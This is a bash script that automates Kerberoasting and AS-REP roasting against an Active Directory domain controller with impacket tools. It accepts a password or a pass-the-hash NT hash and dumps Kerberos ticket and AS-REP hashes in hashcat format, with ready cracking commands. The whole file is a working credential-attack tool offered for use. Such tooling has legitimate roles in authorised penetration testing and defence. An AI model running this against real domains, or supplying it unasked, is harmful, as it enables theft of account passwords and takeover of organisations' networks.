#!/usr/bin/env bash
#
# kerberoast.sh
#
# Kerberoasting and AS-REP roasting with impacket. Requests service tickets for
# accounts with an SPN (needs valid creds), and/or grabs AS-REP hashes for
# accounts with pre-auth disabled (needs only a user list). Output is written in
# hashcat format ready for crack.sh.
#
# Usage:
#   ./kerberoast.sh 10.0.0.1 -d corp.local -u jdoe -p 'Passw0rd!'          # roast SPNs
#   ./kerberoast.sh 10.0.0.1 -d corp.local -u jdoe -H <nthash> --out ./roast
#   ./kerberoast.sh 10.0.0.1 -d corp.local -U users.txt --asrep            # AS-REP, no creds
#
set -uo pipefail

DOMAIN=""
USER=""
PASS=""
NTHASH=""
USERS=""
OUT=""
ASREP=0

die()  { echo "ERROR: $*" >&2; exit 1; }
have() { command -v "$1" >/dev/null 2>&1; }

usage() {
  grep '^#' "$0" | sed 's/^# \{0,1\}//' | sed '/^!/d'
  exit "${1:-0}"
}

# impacket tools ship as impacket-<name> on Parrot, or <name>.py elsewhere.
imp() {
  for n in "impacket-$1" "$1.py" "$1"; do have "$n" && { echo "$n"; return 0; }; done
  return 1
}

# --- parse args -----------------------------------------------------------
DC=""
while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help)   usage 0 ;;
    -d|--domain) shift; [ $# -gt 0 ] || die "-d needs a value"; DOMAIN="$1" ;;
    -u|--user)   shift; USER="$1" ;;
    -p|--pass)   shift; PASS="$1" ;;
    -H|--hash)   shift; NTHASH="$1" ;;
    -U|--users)  shift; USERS="$1" ;;
    --asrep)     ASREP=1 ;;
    --out|-o)    shift; [ $# -gt 0 ] || die "--out needs a path"; OUT="$1" ;;
    --out=*)     OUT="${1#*=}" ;;
    -*)          die "Unknown option: $1 (try --help)" ;;
    *)           [ -z "$DC" ] || die "Only one DC allowed."; DC="$1" ;;
  esac
  shift
done
[ -n "$DC" ]     || { echo "No domain controller given." >&2; usage 2; }
[ -n "$DOMAIN" ] || { echo "No domain (-d) given." >&2; usage 2; }

slug=$(printf '%s' "$DOMAIN" | tr -cd 'a-zA-Z0-9._-')
[ -n "$OUT" ] || OUT="./roast_${slug}"
mkdir -p "$OUT"

did_something=0

# --- Kerberoast (needs creds) --------------------------------------------
if [ -n "$USER" ] && { [ -n "$PASS" ] || [ -n "$NTHASH" ]; }; then
  GS=$(imp GetUserSPNs) || die "impacket GetUserSPNs not found (apt install python3-impacket)."
  echo ">> Kerberoasting via $GS..."
  auth=("${DOMAIN}/${USER}")
  if [ -n "$NTHASH" ]; then authflag=(-hashes ":$NTHASH"); else authflag=(-no-pass); fi
  # build password vs hash invocation
  if [ -n "$NTHASH" ]; then
    "$GS" -dc-ip "$DC" -request -outputfile "$OUT/kerberoast.hashes" -hashes ":$NTHASH" "${DOMAIN}/${USER}" > "$OUT/kerberoast.log" 2>&1 || true
  else
    "$GS" -dc-ip "$DC" -request -outputfile "$OUT/kerberoast.hashes" "${DOMAIN}/${USER}:${PASS}" > "$OUT/kerberoast.log" 2>&1 || true
  fi
  if [ -s "$OUT/kerberoast.hashes" ]; then
    echo ">> [+] $(grep -c '\$krb5tgs\$' "$OUT/kerberoast.hashes") TGS hash(es) -> $OUT/kerberoast.hashes"
    echo ">>     crack.sh $OUT/kerberoast.hashes --type 13100"
  else
    echo ">> No kerberoastable accounts (or request failed; see $OUT/kerberoast.log)."
  fi
  did_something=1
fi

# --- AS-REP roast (needs only a user list) --------------------------------
if [ "$ASREP" -eq 1 ] || { [ -n "$USERS" ] && [ -z "$USER" ]; }; then
  [ -n "$USERS" ] || die "--asrep needs -U users.txt"
  [ -f "$USERS" ] || die "User list not found: $USERS"
  GN=$(imp GetNPUsers) || die "impacket GetNPUsers not found."
  echo ">> AS-REP roasting via $GN..."
  "$GN" "${DOMAIN}/" -usersfile "$USERS" -dc-ip "$DC" -no-pass -outputfile "$OUT/asrep.hashes" > "$OUT/asrep.log" 2>&1 || true
  if [ -s "$OUT/asrep.hashes" ]; then
    echo ">> [+] $(grep -c '\$krb5asrep\$' "$OUT/asrep.hashes") AS-REP hash(es) -> $OUT/asrep.hashes"
    echo ">>     crack.sh $OUT/asrep.hashes --type 18200"
  else
    echo ">> No AS-REP-roastable accounts (or request failed; see $OUT/asrep.log)."
  fi
  did_something=1
fi

[ "$did_something" -eq 1 ] || die "Nothing to do: give creds (-u/-p or -H) to kerberoast, or -U with --asrep."

echo
echo "================ SUMMARY ================"
echo "Output : $OUT/"
ls -1 "$OUT" | sed 's/^/   /'
echo "========================================"
